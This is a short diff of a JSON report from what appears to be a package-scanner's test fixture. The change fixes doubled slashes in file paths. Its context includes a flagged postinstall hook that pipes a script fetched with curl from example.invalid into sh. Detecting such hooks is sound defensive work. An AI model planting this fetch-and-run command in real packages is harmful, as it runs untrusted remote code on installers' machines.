@@ -4,7 +4,7 @@
   "heuristics_version": "heuristics-v1",
   "scanned_at": "2026-10-12T00:00:00Z",
   "target": "{root}",
-  "lockfile": "{root}//package-lock.json",
+  "lockfile": "{root}/package-lock.json",
   "project_score": 50,
   "project_severity": "high",
   "gate": {
@@ -76,7 +76,7 @@
       "package_version": "1.0.0",
       "package_path": "",
       "hook": "postinstall",
-      "location": "{root}//package.json#scripts.postinstall",
+      "location": "{root}/package.json#scripts.postinstall",
       "raw": "curl https://example.invalid/setup.sh | sh",
       "provenance": "manifest"
     }
